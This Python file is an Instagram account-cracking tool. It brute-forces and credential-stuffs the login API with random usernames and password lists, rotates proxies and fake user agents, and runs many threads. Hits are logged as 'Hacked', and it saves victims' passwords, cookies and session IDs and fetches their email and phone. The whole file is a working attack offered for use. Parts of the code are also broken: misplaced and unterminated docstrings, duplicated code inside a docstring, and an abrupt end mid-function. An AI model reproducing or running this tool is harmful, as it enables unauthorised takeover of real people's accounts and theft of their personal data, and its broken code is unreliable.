import os
try:
	import requests,random,threading
	from time import sleep
	from requests import get,post
	from colorama import Fore
except Exception as Joker:exit(Joker)
Blou = Fore.BLUE
red = "\033[1;31;40m";yel = '\033[1;33;40m'
grn = '\033[1;32;40m';wit = "\033[1;37;40m"
errorPas = 'The password you entered is incorrect';login = 'logged_in_user'
errorNam = "Please check your username and try again."
none = 'Invalid Parameters'
band_use = 'inactive user'
secure = 'challenge_required'
withs = 'Please wait a few minutes before you try again';errReq = 'Bad request'
errorFUOt = "We're working on it and we'll get it fixed as soon as we can."
def Exit():exit(0)
    """Exits the program.
    Parameters:
        - None
    Returns:
        - None
    Processing Logic:
        - Exit the program.
        - No return value.
        - Exit code 0 means successful termination."""
    
class All_Seve:
	def SeveHck(user,pess,coke):
		"""Saves the user's login credentials and cookies in a text file for future use.
		Parameters:
		- user (str): The username of the Instagram account.
		- pess (str): The password of the Instagram account.
		- coke (str): The cookies of the Instagram account.
		Returns:
		- None: This function does not return any value.
		Processing Logic:
		- Opens a text file in append mode.
		- Writes the username, password, and cookies in a specific format.
		- Closes the text file."""
		
		with open('Hacked-insta.txt', 'a') as J:
			J.write('------\n'+user+':'+pess+'\nCookies:'+coke+'\n')
	def SeveScour(user,pess):
		""""Function to save a user's login credentials for Instagram in a secure file."
		Parameters:
		- user (str): The username of the Instagram account.
		- pess (str): The password of the Instagram account.
		Returns:
		- None: The function does not return any value.
		Processing Logic:
		- Opens a file in append mode.
		- Writes the username and password in the format of "username:password" to the file.
		- Adds a new line after each entry.
		- The file is saved in a secure location.
		Example:
		SeveScour('johndoe', 'password123')
		# This will save the login credentials for the Instagram account with username 'johndoe' and password 'password123' in the file 'secure-insta.txt'."""
		
		with open('secure-insta.txt', 'a') as J:
			J.write(user+':'+pess+'\n')
	def SeveBand(user,pess):
		""""Appends a user and their favorite band to a text file.
		Parameters:
		- user (str): The username of the user.
		- pess (str): The name of the user's favorite band.
		Returns:
		- None: The function does not return any value.
		Processing Logic:
		- Opens a text file in append mode.
		- Writes the user and their favorite band to the file.
		- Uses a colon to separate the user and band.
		- Adds a new line after each entry.""""
		
		with open('Band-insta.txt', 'a') as J:
			J.write(user+':'+pess+'\n')
def Info_user(user,pess,coke,sisn):
	"""This function sends a GET request to retrieve user information from Instagram and then saves the data in a separate thread using the All_Seve.SeveHck function.
	Parameters:
	- user (str): The username of the Instagram account.
	- pess (str): The password of the Instagram account.
	- coke (str): The Instagram account's cookie.
	- sisn (str): The Instagram account's session ID.
	Returns:
	- None: This function does not return any value.
	Processing Logic:
	- Sends a GET request to retrieve user information from Instagram.
	- Saves the data in a separate thread using the All_Seve.SeveHck function.
	- If the user's email or phone number is available, it will be saved. Otherwise, "None" will be saved."""
	
	getn=get('https://www.instagram.com/accounts/edit/?__a=1&__d=dis',headers={'Host': 'www.instagram.com','X-ASBD-ID': '198387','X-Requested-With': 'XMLHttpRequest','X-IG-App-ID': '1217981644879628','Accept-Language': 'ar','Accept': '*/*','User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Connection': 'keep-alive','Referer': 'https://www.instagram.com/accounts/edit/','X-IG-WWW-Claim': 'hmac.AR1carwb5gWoeMAlK7PfzBjO790rGGfeGXbhwAUkESygrYzG','Cookie': 'sessionid='+sisn})
	if ('email' in getn.text):
		try:email = getn.json()['form_data']['email']
		except KeyError:email="None"
		try:phone = getn.json()['form_data']['phone_number']
		except KeyError:phone="None"
		threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
	else: threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
uuid = get('https://httpbin.org/uuid')
def User_Agent():
	""""Generates a random user agent string for Instagram on Android devices."
	Parameters:
	- None
	Returns:
	- str: A randomly generated user agent string for Instagram on Android devices.
	Processing Logic:
	- Uses randomly selected values for device DPI, model, screen resolution, and Instagram version.
	- Includes the device manufacturer and language code in the user agent string."""
	
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent
class hacker_instagram_Check_automatic:
	def __init__(self):
		"""Initializes the object with the necessary attributes and prompts the user for input.
				Parameters:
					- None
				Returns:
					- None
				Processing Logic:
					- Prompts the user for input and assigns the input to the appropriate attributes.
					- Checks for errors in the input and exits the program if necessary.
					- Prints a message to indicate that the function has been executed.
				self.hack=0
				self.ban=0
				self.err=0
				self.prox=0
				self.secur=0
				self.nones=0
				try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
				except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
				try:self.modPRX=int(input("""
		
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		"""Log_user function is used to hack Instagram accounts by generating random usernames and passwords and attempting to log in with them. It takes in two parameters, self and proxy. The function does not return any value. It uses a while loop to continuously generate new usernames and passwords and attempts to log in with them using the provided proxy. If the login is successful, the function prints out the hacked account information and starts a new thread to save the account. If the login is unsuccessful, the function checks for various errors and increments the corresponding counter. If there is a connection error or a timeout, the function increments the proxy counter. The function also handles keyboard interrupts and exits gracefully.
		Parameters:
		- self (object): An instance of the class that the function is defined in.
		- proxy (list): A list of proxies to use for the login attempts.
		Returns:
		- None: The function does not return any value.
		Processing Logic:
		- Generates random usernames and passwords using the provided lists.
		- Attempts to log in using the generated credentials and the provided proxy.
		- Handles various errors and increments the corresponding counters.
		- Starts a new thread to save the hacked account information.
		- Handles keyboard interrupts and exits gracefully."""
		
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		lst2= 'QqAaZzWw!SsXx?EeDdCcRr!FfVvTtGgBb@YyHhNnUuJj$IiKkMmOoLl&Pp12345#6789'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			pess=str(''.join((random.choice(lst2) for i in range(8))))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					print(grn+f'[+] Hacked >> {user}:{pess}')
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(yel+f'[-] Account Banned >> {user}:{pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(yel+f'[!] secure >> {user}:{pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		""""""
		
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_randomUser_passLiest:
	def __init__(self):
		""""""
		
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		self.pes= input('[$] Enter name file password : ')
		try:self.file=open(self.pes,'r')
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		""""""
		
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			if (pess := self.file.readline().split('\n')[0]) == '':exit(input('over ..'))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					print(grn+f'[+] Hacked >> {user}:{pess}')
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		""""""
		
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_1Target_passLiest:
	def __init__(self):
		""""""
		
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.done=0
		self.done2=0
		self.nones=0
		self.user = input('[$] Enter username : ')
		if self.user=='':exit(input('Errors !!'))
		self.pes= input('[$] Enter name file password : ')
		try:self.file=open(self.pes,'r')
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		""""""
		
		while True:
			if (pess := self.file.readline().split('\n')[0]) == '':exit(input('over ..'))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': self.user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					coke = get.cookies
					print(grn+f'[+] Hacked >> {self.user}:{pess}')
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					try:
						sisn = get.cookies['sessionid']
						while True:
							self.done+=1
							if self.done==1:
								threading.Thread(target=Info_user(self.user,pess,coke,sisn)).start()
								exit(0)
							elif self.done==2:
								threading.Thread(target=Info_user(self.user,pess,coke,sisn)).start()
								exit(0)
							elif self.done==3:Exit()
							else:Exit()
					except KeyError:
						while True:
							self.done2+=1
							if self.done2==1:
								threading.Thread(target=All_Seve.SeveHck(self.user,pess,coke)).start()
								exit(0)
							elif self.done2==2:
								threading.Thread(target=All_Seve.SeveHck(self.user,pess,coke)).start()
								exit(0)
							elif self.done2==3:Exit()
							else:Exit()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(self.user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		""""""
		
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_Rnadom_username:
	def __init__(self):
		""""""
		
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		self.pess = input('[$] Enter password : ')
		if self.pess=='':exit(input('Errors !!'))
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		"""Log_user:
		This function is used to log in a user to the Instagram API and check for any errors or bans. It takes in two parameters, self and proxy. It returns the user's login information and the status of the login attempt.
		Processing Logic:
		- Generates a random username and checks for any errors or bans.
		- If there are no errors, the user is considered hacked and their information is printed.
		- If there are errors, the appropriate error count is incremented.
		- If there is a connection error, the proxy count is incremented.
		- If there is a timeout error, the proxy count is incremented.
		- If there is a keyboard interrupt, the program is exited.
		- If there is a read timeout error, the proxy count is incremented.
		Example:
		Log_user(self)"""
		
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
						PROXY = {
							"http": f"http://{run}",
							"https": f"http://{run}"}
				elif self.modPRX==2:
						PROXY = {
							"socks4": f"socks4://{run}",
							"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': self.pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					self.hack
					print(grn+f'[+] Hacked >> {user}:{self.pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,self.pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,self.pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
